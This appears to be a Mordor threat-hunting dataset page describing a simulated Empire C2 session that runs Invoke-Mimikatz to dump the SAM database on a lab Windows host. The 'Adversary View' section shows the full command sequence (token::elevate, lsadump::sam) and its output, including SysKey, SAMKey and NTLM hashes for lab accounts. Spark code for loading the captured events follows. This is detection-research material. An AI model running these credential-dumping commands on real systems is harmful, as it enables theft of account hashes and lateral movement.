# Empire Mimikatz Lsadump SAM

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190625103712 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/06/25 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_lsadump_sam.tar.gz |

## Dataset Description
This dataset represents adversaries using PowerSploit's Invoke-Mimikatz function to extract hashes from the Security Account Managers (SAM) database

## Adversary View
```
(Empire: Y298VW3B) > usemodule credentials/mimikatz/sam*
(Empire: powershell/credentials/mimikatz/sam) > info

              Name: Invoke-Mimikatz SAM dump
            Module: powershell/credentials/mimikatz/sam
        NeedsAdmin: True
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract
  hashes from the Security Account Managers (SAM) database.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt
  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls
  a

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        Y298VW3B                  Agent to run module on.                 

(Empire: powershell/credentials/mimikatz/sam) > execute
[*] Tasked Y298VW3B to run TASK_CMD_JOB
[*] Agent Y298VW3B tasked with task ID 3
[*] Tasked agent Y298VW3B to run module powershell/credentials/mimikatz/sam
(Empire: powershell/credentials/mimikatz/sam) > Job started: DV6AHB
Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

512	{0;000003e7} 1 D 36238     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000b8e62} 1 F 83841234  	SHIRE\nmartha	S-1-5-21-2511471446-1103646877-3980648787-1106	(12g,23p)	Primary
 * Thread Token  : {0;000003e7} 1 D 85913723  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(powershell) # lsadump::sam
Domain : HR001
SysKey : c7bc124448d3851819e68f8c2c199c2f
Local SID : S-1-5-21-3594478387-3513325568-2589039918

SAMKey : 8b66c564e175f6a7c0c40bc70f65144f

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 63a935cccb1d1be6c4011ec2a68f1a95

RID  : 000003e9 (1001)
User : Nora
  Hash NTLM: f9558f5eff6314996c96ec2c3800d3f0

mimikatz(powershell) # token::revert
 * Process Token : {0;000b8e62} 1 F 83841234  	SHIRE\nmartha	S-1-5-21-2511471446-1103646877-3980648787-1106	(12g,23p)	Primary
 * Thread Token  : no token
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_lsadump_sam.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT channel, COUNT(1)
FROM mordorTable
GROUP BY channel
    '''
)
df.show(10,False)
        